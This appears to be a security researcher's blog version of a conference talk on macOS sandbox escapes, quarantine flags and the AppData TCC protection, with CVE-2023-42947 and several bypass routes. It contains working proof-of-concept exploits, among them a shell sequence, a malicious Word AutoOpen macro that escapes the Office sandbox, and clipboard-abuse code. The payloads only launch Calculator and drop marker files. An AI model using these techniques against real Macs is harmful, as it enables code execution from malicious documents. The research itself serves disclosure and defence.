---
layout: post
title: "Unveiling Mac Security: A Comprehensive Exploration of Sandboxing and AppData TCC"
date: 2024-08-24
categories:
 - Apple
 - macOS
---

* TOC
{:toc}




## **Preface**

This presentation was first presented at [Blackhat USA 2024](https://www.blackhat.com/us-24/briefings/schedule/#unveiling-mac-security-a-comprehensive-exploration-of-sandboxing-and-appdata-tcc-40111) in English, then presented at [KCon 2024](https://mp.weixin.qq.com/s/gbvyOh8oqjnfCUhypCaNDA) in Chinese.

Download the PDF here: [https://github.com/guluisacat/MySlides/tree/main/BlackHatUSA2024_KCon2024](https://github.com/guluisacat/MySlides/tree/main/BlackHatUSA2024_KCon2024)



**I was focused on Android bug hunting and switched Android to Apple for vulnerability research because :**

- Better vulnerability disclosure policies than Android OEMs
- Higher bug bounties
- I built a [system using AFL + Unicorn](https://imlzq.com/android/fuzzing/unicorn/tee/2024/05/29/Dive-Into-Android-TA-BugHunting-And-Fuzzing.html) to simulate and fuzz Android TAs. By building a custom syscall API, it can be adapted for macOS/iOS



**Goals:**

- Analyze and exploit macOS userland vulnerabilities to identify fuzzing targets
- Bypass all user space security mechanisms to gain full control of the computer

**Findings:**

So far, over 40 exploitable logic vulnerabilities have been discovered since July 2023.



**Content Adjustment Due to Unpatched Vulnerabilities:**

I planned to disclose 16 vulnerabilities but Apple responded that they cannot fix them all.

So I have to omit some details in this presentation.

---



## **1. Security Protections on macOS**

### **1.1 System Integrity Protection: Rootless**

[https://support.apple.com/en-us/102149](https://support.apple.com/en-us/102149)

> System Integrity Protection is a security technology that helps protect your Mac from malicious software.
>
> System Integrity Protection is a security technology designed to help prevent potentially malicious software from modifying protected files and folders on your Mac. System Integrity Protection restricts the root user account and limits the actions that the root user can perform on protected parts of the Mac operating system.
>
> Before System Integrity Protection (introduced in OS X El Capitan), the root user had no permission restrictions, so it could access any system folder or app on your Mac. Software obtained root-level access when you entered your administrator name and password to install the software. That allowed the software to modify or overwrite any system file or app.
>
> System Integrity Protection is designed to allow modification of these protected parts only by processes that are signed by Apple and have special entitlements to write to system files, such as Apple software updates and Apple installers. Apps that you download from the App Store already work with System Integrity Protection. Other third-party software, if it conflicts with System Integrity Protection, might be set aside when you upgrade to OS X El Capitan or later.
>
> System Integrity Protection also helps prevent software from selecting a startup disk. [Learn how to change your startup disk](https://support.apple.com/guide/mac-help/mchlp1034/mac).

- [https://opensource.apple.com/source/xnu/xnu-7195.81.3/bsd/sys/csr.h.auto.html ](https://opensource.apple.com/source/xnu/xnu-7195.81.3/bsd/sys/csr.h.auto.html )
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture1.png" style="zoom:50%; display: block; margin: 0 auto;" />
- [https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)



### **1.2 Transparency, Consent, and Control : TCC**

- Works similarly to Android permissions
- Dynamically applied when needed
- General TCC bypass vulnerability is more valuable than userland root LPE



---





## **2. Transforming a Traditionally Useless Bug into a Sandbox Escape: A General Application Sandbox Escape Approach**

### **2.1 Remote Attack Surfaces on macOS**

I categorized the remote attack surfaces on macOS into three different types:

- Memory corruption vulnerabilities
  - Safari, Messages, Mail, FaceTime, Pictures, Video/Audio, PDF, etc
- Download and launch an untrusted app
  - Gatekeeper Bypass
- [From 3rd party apps] Malicious documents
  - SBX from Office

In this presentation, I would like to focus on the third type, aiming to achieve RCE through a malicious document, which means I need to escape from the Office sandbox.



### **2.2 App Sandbox Escape on macOS**

On macOS, if we want to escape from the app sandbox, we have three different methods:

- Exploit sandboxd or sandbox profiles
- Exploit XPC services or syscalls
- Launch a fully controlled non-sandboxed app

I will focus on the third method: trying to launch a fully controlled non-sandboxed app to escape from the application sandbox.



**This is the simplest app structure:**

```shell
sh-3.2$ ls -R hello.app/
Contents

hello.app/Contents:
MacOS

hello.app/Contents/MacOS:
hello
```

We only need to create the `hello.app/Contents/MacOS` folders, and place an executable file under the MacOS folder



**macOS supports different executable file formats depending on the chip architecture:**

- Intel Chips
  - Shell scripts
  - x86_64 binaries
- ARM Chips (Apple Silicon)
  - Supports ARM binaries by default
  - Supports x86_64 binaries and shell scripts with Rosetta installed

In this talk, all PoCs tested on Intel Macbook. If you wanna test them in ARM Mac, you may need to do some little changes.



**And macOS has some security protections on this attack surface:**

- Any file modified by a sandboxed app is assigned the Quarantine attribute
- Quarantine prevents harmful files from being executed or opened without user consent

### **2.3 Quarantine Protection on macOS**

Quarantine contains 4 parts and I believe the most important part of Quarantine is the first part, `Quarantine flags`.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-172409.png" style="zoom:50%; display: block; margin: 0 auto;" />



#### **2.3.1 Quarantine Protection on macOS: Untrusted App**

If we download a file with Safari, the file will be tagged with Quarantine attribute:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-172541.png" style="zoom:50%; display: block; margin: 0 auto;" />



If we try to launch the quarantined app, Gatekeeper will block its launch:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-124726.png" style="zoom:50%; display: block; margin: 0 auto;" />

We need to go to `System Settings` to allow the operation:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-171718.png" style="zoom:50%; display: block; margin: 0 auto;" />

If we click the `Open Anyway` button, a dialog pops up, we need to input the admin password.

After this, a new dialog pops up, we need to click `Open` button once again:



<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-171809.png" style="zoom:50%; display: block; margin: 0 auto;" />





After the click, the app finally launches,`syspolicyd` adds its quarantine flags with `0x40`:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-171630.png" style="zoom:50%; display: block; margin: 0 auto;" />

And the next time when we launch the user-permitted app, `syspolicyd` will not prevent its launch because the quarantine flags contains `0x40`:

- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-125206.png" style="zoom:70%; display: block; margin: 0 auto;" />
- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-172646.png" style="zoom:50%; display: block; margin: 0 auto;" />

#### **2.3.2 Quarantine Protection on macOS: Trusted App**

Another situation is launching a trusted app. Developers can upload the app to Apple's server for notarization. Apple will do some basic scan and analysis, after this process, only a single additional click is required to launch the notarized app:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-134521.png" style="zoom:50%; display: block; margin: 0 auto;" />



#### **2.3.3 Quarantine Protection on macOS: Summary**

Let’s make a summary, regardless of whether the app is trusted or untrusted, at least an additional click is required to launch it.

It's a nice security protection effectively mitigate the 1-Click RCE attack surface



### **2.4 Can We Launch an Executable File Without Modifying Its Quarantine Flags?**

**Yes**. We can use an app folder that doesn‘t set the Quarantine attribute to wrap the executable file :

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture4.png" style="zoom:50%; display: block; margin: 0 auto;" />

**If there is a vulnerability that allows us to create an app folder without quarantine attribute, can we use it to bypass the sandbox?**

Have a try:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-125747.png" style="zoom:70%; display: block; margin: 0 auto;" />

Failed. It appears that macOS applies different security policies based on the specific quarantine flags:

- If the quarantine flag is not equal to `0086`, the quarantined app is launchable
- If the quarantine flag is equal to `0086`, the quarantined app is unlaunchable



### **2.5 My Hypothesis**

I believe the design of Quarantine incorporates the concept of whether the user has permitted this operation

- **If the operation is authorized:**
  - Any write operation to a file will be assigned a flag other than `0086`
    - E.G. : `0081 / 0082 / 0083`
  - The system will handle it in a softer way
- **If the operation is not authorized:**
  - Any write operation to a file will be assigned the `0086` flag
  - The system will use the strictest policies to handle this file



### **2.6 Validating My Hypothesis: From a Code Perspective**

[https://github.com/apple-oss-distributions/WebKit/blob/WebKit-7618.2.12.11.6/Source/WebCore/PAL/pal/spi/mac/QuarantineSPI.h](https://github.com/apple-oss-distributions/WebKit/blob/WebKit-7618.2.12.11.6/Source/WebCore/PAL/pal/spi/mac/QuarantineSPI.h)

```c
enum qtn_flags {
    QTN_FLAG_DOWNLOAD = 0x0001,
    QTN_FLAG_SANDBOX = 0x0002,
    QTN_FLAG_HARD = 0x0004,
    QTN_FLAG_USER_APPROVED = 0x0040,
};
```

Here’s a demo of how Apple uses these quarantine APIs to generate the quarantine attribute:

[https://opensource.apple.com/source/WebKit2/WebKit2-7610.4.3.0.3/UIProcess/Cocoa/WKShareSheet.mm.auto.html](https://opensource.apple.com/source/WebKit2/WebKit2-7610.4.3.0.3/UIProcess/Cocoa/WKShareSheet.mm.auto.html)

```c
+ (BOOL)applyQuarantineSandboxAndDownloadFlagsToFileAtPath:(NSURL *)fileURL
{
    qtn_file_t fq = qtn_file_alloc();
    auto scopeExit = WTF::makeScopeExit([&] {
        qtn_file_free(fq);
    });
    
    int quarantineError = qtn_file_init_with_path(fq, fileURL.fileSystemRepresentation);
    if (quarantineError)
        return NO;

    quarantineError = qtn_file_set_flags(fq, QTN_FLAG_SANDBOX | QTN_FLAG_DOWNLOAD);
    if (quarantineError)
        return NO;

    quarantineError = qtn_file_apply_to_path(fq, fileURL.fileSystemRepresentation);
    
    return YES;
}
```

#### **2.6.1 Extract Quarantine Kernel extension**

The Quarantine kernel extension generates the attribute.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture5.png" style="zoom:70%; display: block; margin: 0 auto;" />

And the Quarantine kernel extension is packed into the `kernelcache`, so we need to download the firmware first. 

- [https://ipsw.me/](https://ipsw.me/)
- [https://developer.apple.com/download/](https://developer.apple.com/download/)

The `kernelcache` is in `IM4P` format:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture6.png" style="zoom:50%; display: block; margin: 0 auto;" />

We can use this script to extract its content:

```shell
#!/bin/bash

if [ -z "$1" ]; then
    echo "Error: No input file specified."
    echo "Usage: $0 <input_kernelcache>"
    exit 1
fi

input_kernelcache=$1

if [ ! -f "$input_kernelcache" ]; then
    echo "Error: File '$input_kernelcache' not found."
    echo "Usage: $0 <input_kernelcache>"
    exit 1
fi

kernelcache="./out_kernelcache"

pyimg4 im4p extract -i "$input_kernelcache" -o "$kernelcache"

kextex -l "$kernelcache" | grep -v "Listing Images" | grep -v "\-\-\-\-" > kext_list.txt

while IFS= read -r kext_name; do
    echo "Extracting $kext_name..."
    kextex -e "$kext_name" "$kernelcache"
done < kext_list.txt

echo "All kexts have been extracted."
```

After this, we can use `IDA pro`  analyze the binary:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture7.png" style="zoom:50%; display: block; margin: 0 auto;" />

#### **2.6.2 Process to Generate the Quarantine Flag**

A sandboxed app is not allowed to modify files' Quarantine attribute:

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-131040.png" style="zoom:70%; display: block; margin: 0 auto;" />

And If the input flag does not contain `0x40` and the lowest two bits are non-zero, the `0x80` flag will be added:

> Final Quarantine Flag = Input_Flag \| 0x80

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-172822.png" style="zoom:50%; display: block; margin: 0 auto;" />

It means: 

```shell
quarantine flag 0081 : QTN_FLAG_DOWNLOAD
quarantine flag 0082 : QTN_FLAG_SANDBOX
quarantine flag 0083 : QTN_FLAG_SANDBOX + QTN_FLAG_DOWNLOAD
quarantine flag 0086 : QTN_FLAG_SANDBOX + QTN_FLAG_HARD
```



#### **2.6.3 Launch the Quarantined app**

If we try to launch a quarantined app with a quarantine flag set to `0086`, `Quarantine.kext` will block the operation because it's not authorized. At this point, the user has only one option: to move the app to the trash bin. The system even disables the `Open Anyway` option in `System Settings`. The OS treats this operation as malicious.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173147.png" style="zoom:70%; display: block; margin: 0 auto;" />

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-165923.png" style="zoom:50%; display: block; margin: 0 auto;" />



### **2.7 SBX Through Launching a Non-Sandboxed App**

My Hypothesis is correct.

If we want to achieve SBX through launching a non-sandboxed app, we need to do 2 things

1. Identify a vulnerability that allows the creation of an app folder without the quarantine attribute

2. Discover a vulnerability or utilize a feature to create an executable file with a quarantine flag other than 0086



### **2.8 CVE-2023-42947: Creating an App Folder Without the Quarantine Attribute**

[https://support.apple.com/en-us/HT214036](https://support.apple.com/en-us/HT214036)

Impact : macOS 10.15 – 14.0

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173228.png" style="zoom:50%; display: block; margin: 0 auto;" />



**On Apple platforms, there are two kinds of containers:** 

- Application container: 
  - `~/Library/Container/{App_bundle_id}`

- Group container: 
  - `~/Library/Group Container/{group_id}`

Below macOS 15, the group containers of third-party apps are not protected and behave differently compared to iOS.

[https://developer.apple.com/documentation/foundation/](https://developer.apple.com/documentation/foundation/nsfilemanager/1412643-containerurlforsecurityapplicati)

[nsfilemanager/1412643-containerurlforsecurityapplicati](https://developer.apple.com/documentation/foundation/nsfilemanager/1412643-containerurlforsecurityapplicati)

- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173324.png" style="zoom:50%; display: block; margin: 0 auto;" />
- <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173333.png" style="zoom:30%; display: block; margin: 0 auto;" />



**Group Containers (Below 14.0) :**

- iOS: Upon app launch, `Container Manager` automatically creates the corresponding group containers and restricts access based on teamID
- macOS: `Container Manager` does not automatically create group containers for an app upon its first launch
  - They are only created when the user calls API
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture12.png" style="zoom:50%; display: block; margin: 0 auto;" />



**Vulnerability:**

- `Container Manager` is the core management component for app sandboxing, it has FDA access and also faces some sandbox restrictions
- There is a path traversal vulnerability in group container folder creation process
- The created folder isn’t tagged with the quarantine attribute
- This API can also be triggered via XPC

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture13.png" style="zoom:50%; display: block; margin: 0 auto;" />



**Patch:**

- [macOS 14.1 - 14.5] App’s group containers are now automatically created upon the app‘s first launch
- The `containerURLForSecurityApplicationGroupIdentifier` API only returns the URL and does not perform folder creation



### **2.9 0082 Routes**

I solved the first challenge quickly. 

Now, we need to focus on the second challenge, which actually took me more time than the first one.

In fact, macOS has significant issues when determining if an operation is user-approved.

I will introduce 4 different routes to achieve this.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173434.png" style="zoom:50%; display: block; margin: 0 auto;" />



#### **2.9.1 Route 1 : Privilege Entitlement**

- As long as the app declares the entitlement, any operation on files will be marked as 0082 quarantine flag
- Regardless of whether the app actually has read-write permissions for the Downloads folder

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-173518.png" style="zoom:40%; display: block; margin: 0 auto;" />



**This entitlement is widely used in many applications:**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-141944.png" style="zoom:50%; display: block; margin: 0 auto;" />

For these apps, we only need a vulnerability that allows the creation of arbitrary folders to achieve a SBX

```shell
rm -rf ./hello.app
echo "use framework \"Foundation\"\n\nset theAppGroup to \"../Containers/com.apple.mail/Data/hello.app\"\nset theFileManager to current application's NSFileManager's defaultManager()\nset theContainerURL to theFileManager's containerURLForSecurityApplicationGroupIdentifier:theAppGroup\nreturn theContainerURL as text" > hello.scpt
osascript hello.scpt
rm -rf ./hello.app/*
rm -rf ./hello.app/.*
mkdir -p hello.app/Contents/MacOS
echo '#!/bin/sh' > hello
echo 'open -a Calculator' >> hello
echo 'touch /tmp/YOUHAVEBEENHACKED' >> hello
chmod 777 hello
mv hello hello.app/Contents/MacOS/hello
open ./hello.app
```



**Obviously, the route has some limitations:**

`Microsoft Word` and many other applications don‘t declare the entitlement. 

*We* need to find another way to exploit them.



#### **2.9.2 Route 2: Abuse User-Selected Feature**

**What is User-Selected Feature?**

If Terminal attempts to open `~/Documents/flag.txt` with TextEdit, it will be denied.

- flag.txt is a protected file
- Neither the requesting Terminal nor the handling TextEdit has access to it

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-142322.png" style="zoom:50%; display: block; margin: 0 auto;" />



However, if we double-click on `~/Documents/flag.txt` in Finder, TextEdit will be able to load the file correctly

- This is because the user **explicitly** wants to use TextEdit to open `flag.txt`, so the OS will fully grant file access to TextEdit
- This is called the `User-Selected */* User-Approved` feature



If we request Camera TCC, as long as the user clicks the `Allow` button, we will gain access to the Camera. This is also considered a `User-Selected` feature.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-142544.png" style="zoom:50%; display: block; margin: 0 auto;" />



From a system design perspective, I believe `User-Selected / User-Approved` feature is one of the most powerful functions on mac

- Only Root and SIP can limit its behavior

And the most important is, the design of Quarantine incorporates the concept of whether the user has permitted this operation.



**Can we use the `User-Selected / User-Approved` feature to change the Quarantine flag?**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-142828.png" style="zoom:50%; display: block; margin: 0 auto;" />



**For example:**

- If we receive a document in WeChat, and then double-click it to open with Microsoft Word, Word will have full control over the document. 
- Any subsequent file operations performed by Word on this document will be tagged with `0082` quarantine flag instead of `0086`.

So under macOS 14.0, if we want to escape from the sandbox of Microsoft Word, we only need to inject a payload into the received or opened document, then set the previously created non-sandboxed app's executable file as a symbolic link pointing to this modified document.

<video width="640" height="360" controls>
  <source src="{{ site.url }}/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/video1.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

**Why the Exploit Failed on macOS 14?**

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-143428.png" style="zoom:50%; display: block; margin: 0 auto;" />

I developed this exploit on August 20, last year, during the transition between macOS 13 and macOS 14.

After updated to macOS 14, the initial exploit steps still executed as expected



But the malicious non-sandboxed app failed to launch.

At that time, I registered for `GeekCon2023` with this vulnerability and successfully passed the selection process. Although I ultimately withdrew from the competition for various reasons, the issue was pressing and needed to be resolved at that time.



Why? Why was this happened?



**Because macOS 14 introduced a new TCC : AppData**

>  : ) This was the first time I truly experienced the impact of security protections on exploit development  



Below macOS 14, any non-sandboxed process could access the private containers of any third-party app, such as WhatsApp's and Telegram's.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture14.png" style="zoom:50%; display: block; margin: 0 auto;" />

The new TCC effectively closes this attack surface. 

This is a nice security protection and it makes the security of desktop OS closer to mobile os.



**Impact of AppData TCC on Exploit:**

- If the executable file is a shell script, `/bin/sh` would execute this script 
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-170311.png" style="zoom:50%; display: block; margin: 0 auto;" />
- But `/bin/sh` does not have access to the private container folder of WeChat, which would prevent the script from launching
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-170322.png" style="zoom:50%; display: block; margin: 0 auto;" />



**Hold on! A question arises:**

- If the executable file is a regular file, the `hello.app` is launchable:
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-170432.png" style="zoom:50%; display: block; margin: 0 auto;" />
- But if the executable file is a symbolic link, the `hello.app` is unlaunchable.
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-170440.png" style="zoom:50%; display: block; margin: 0 auto;" />

**Why?**

The file hello is in the HelloMac’s private container folder too, so why can `/bin/sh` access it even it is protected by AppData TCC?



##### **2.9.2.1 A Vulnerability: No CVE**

Because macOS has an exception rule for accessing directories ending in `.app`. If a path matches this pattern, all apps can directly access its contents, regardless of whether the directory is protected by TCC.

> [https://](https://support.apple.com/HT214088)[support.apple.com](https://support.apple.com/HT214088)[/HT214088](https://support.apple.com/HT214088)
>
> [https://](https://support.apple.com/HT214086)[support.apple.com](https://support.apple.com/HT214086)[/HT214086](https://support.apple.com/HT214086)
>
> [https://](https://support.apple.com/HT214084)[support.apple.com](https://support.apple.com/HT214084)[/HT214084](https://support.apple.com/HT214084)
>
> [https://](https://support.apple.com/HT214081)[support.apple.com](https://support.apple.com/HT214081)[/HT214081](https://support.apple.com/HT214081)

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture19.png" style="zoom:50%; display: block; margin: 0 auto;" />



**NO CVE: Patch**

- We cannot use the vulnerability to access files in some sensitive directories now
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-170534.png" style="zoom:50%; display: block; margin: 0 auto;" />
  - <img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture21.png" style="zoom:50%; display: block; margin: 0 auto;" />
- But we can still launch apps from protected directories
- It seems that Apple wants to keep the exception for launching apps



**Returning to the app sandbox topic, we need to find another way to modify the quarantine flag.**



#### **2.9.3 Route 3 : Abuse OpenFile Apple Event**

- `User-Selected` is a crucial feature
- macOS should ensure that malicious applications cannot emulate click events or trigger the permission-granting mechanism without user interaction

But if we execute `open -a {AppID} ./hello.txt` , the operation will make the specified app open hello.txt. Subsequent operations on the input file will be treated as user-approved and will tag the file with the 0082 quarantine flag instead of 0086.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-151018.png" style="zoom:50%; display: block; margin: 0 auto;" />

**We can execute the command ourselves and set the responder to be our own process, allowing us to open the specified file without any user interaction. In this case, although the operation clearly lacks user permission or interaction, the OS mistakenly treats it as if it were user-authorized.**



We only need to execute `open -a Microsoft Word ./executablefile` and then inject the payload to the executable file, this operation changes the executable file's quarantine flag directly.

>  Malicious macro.docm : 

```shell
Function GetDocumentPath() As String
    Dim docPath As String
    docPath = ActiveDocument.Path
    If docPath = "" Then
        GetDocumentPath = ""
    Else
        GetDocumentPath = docPath
    End If
End Function

Sub AutoOpen()
    Dim scriptCode As String
    Dim docPath As String
    Dim docName As String
    Dim fullPath As String
    
    Dim step1 As String
    Dim step2 As String
    Dim step3 As String
    Dim step4 As String

    docPath = GetDocumentPath
    docName = ActiveDocument.Name
    fullPath = docPath & "/" & docName
    
    ' Clean
    step1 = "rm -rf hello*;rm -rf .com.apple.containermanagerd.metadata.plist.app;"
    
    ' Create malicious folders and execfile
    step2 = "echo \""use framework \""\\\""Foundation\\\""\""\\n\\nset theAppGroup to  \""\\\""../Containers/com.microsoft.word/Data/.com.apple.containermanagerd.metadata.plist.app/Contents/MacOS\\\""\""\\nset theFileManager to current application's NSFileManager's defaultManager()\nset theContainerURL to theFileManager's containerURLForSecurityApplicationGroupIdentifier:theAppGroup\nreturn theContainerURL as text    \"" > hello.scpt;osascript hello.scpt;"
    
    ' Gain 0082 access then inject payloads into execfile and modify execfile's mode.
    step3 = "open -a \""Microsoft Word\"" .com.apple.containermanagerd.metadata.plist.app/Contents/MacOS/.com.apple.containermanagerd.metadata.plist; (sleep 1; echo  \""#!/bin/sh\nopen -a Calculator\ntouch /tmp/YOUHAVEBEENHACKED\ntouch ~/Desktop/YOUHAVEBEENHACKED\"" > .com.apple.containermanagerd.metadata.plist.app/Contents/MacOS/.com.apple.containermanagerd.metadata.plist;chmod 777 .com.apple.containermanagerd.metadata.plist.app/Contents/MacOS/.com.apple.containermanagerd.metadata.plist; open ./.com.apple.containermanagerd.metadata.plist.app) &> /dev/null &"
    If docPath <> "" Then
        scriptCode = "do shell script "" " & step1 & "  " & step2 & " " & step3 & " """
        MacScript (scriptCode)
    End If
End Sub
```



**Limitations:**

- This exploit opens a new UI to handle a document, making the attack noticeable to the user, which is not ideal for weaponization.

  - If the user opens the malicious document, two documents will be opened.

- If an application has not implemented the `application:openfile` and `application:openfiles` interfaces, this method will not work

  

**Is there a more general, silent, and weaponizable approach we can use?**

**Yes. We can abuse Clipboard.**



#### **2.9.4 Route 4 : Abuse Clipboard**

We first discuss a flaw in Clipboard on macOS. On iOS, the Clipboard component is protected by TCC, but macOS not.

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/WX20240819-170659.png" style="zoom:50%; display: block; margin: 0 auto;" />

Therefore, if we are a sandboxed app, we can monitor the Clipboard and modify the content if the copied item is a file.

<video width="640" height="360" controls>
  <source src="{{ site.url }}/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/video2.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

**Cross-Device Clipboard Exploitation:**

- The Clipboard not only breaks the sandbox restrictions but also allows us to use macOS as a stepping stone to compromise the user's iOS device
- By abusing macOS's Handoff feature, we can monitor, hijack, and modify Clipboard data on iOS, such as altering copied Bitcoin wallet addresses and stealing mnemonic phrases



If we try to modify the copied bitcoin wallet address, do we need the iOS 0day? NONONO, we just need a macOS 0day.

<video width="640" height="360" controls>
  <source src="{{ site.url }}/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/video3.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

If a hacker aims to steal data from your iOS device but finds the attack surface too narrow, targeting macOS or iCloud may provide a better solution.

Therefore, if you use both macOS and iOS and own highly sensitive data, it is recommended to disable Handoff.



**macOS15 : iPhone Mirroring**

- When I prepared my PPT, iPhone Mirroring hadn't been released yet
- I'm not sure how it works, but the function sounds risky
- Taking over my Mac could mean taking over my iPhone silently 
- The demand for macOS 0-day exploits may increase in the future



**Returning to the SBX topic:**

We can abuse the Clipboard to achieve SBX because the copy operations are mistakenly assumed to have user consent.

If a file has a quarantine flag of `0086`, we only need to copy this file and then modify its content. This operation directly changes its quarantine flag to `0082`.

```objective-c
#import <Foundation/Foundation.h>
#import <Cocoa/Cocoa.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        system("pwd; touch hello.txt; touch hello2.txt");

        NSString *currentDirectoryPath = [[NSFileManager defaultManager] currentDirectoryPath];

        NSString *filePath = [currentDirectoryPath stringByAppendingPathComponent:@"hello.txt"];

        NSPasteboard *pasteboard = [NSPasteboard generalPasteboard];
        [pasteboard clearContents]; 

        NSURL *fileURL = [NSURL fileURLWithPath:filePath];
        [pasteboard writeObjects:@[fileURL]];

        [NSThread sleepForTimeInterval:5.0];

        NSArray *filePaths = [pasteboard readObjectsForClasses:@[[NSURL class]] options:nil];
        for (NSURL *fileURL in filePaths) {
            NSLog(@"Copied file path: %@", [fileURL path]);

            NSString *newContent = @"#!/bin/sh\nopen -a Calculator";
            NSError *error = nil;
            if ([newContent writeToFile:[fileURL path] atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
                NSLog(@"Replaced the content of the copied file. The copied file's quarantine file should be 0082");
            } else {
                NSLog(@"Failed to replace the content of the copied file: %@", [error localizedDescription]);
            }
        }
    }
    return 0;
}
```

<img src="/images/2024-08-24-Unveiling-Mac-Security-A-Comprehensive-Exploration-of-TCC-Sandboxing-and-App-Data-TCC/Picture22.png" style="zoom:50%; display: block; margin: 0 auto;" />



### **2.10 Conclusion**

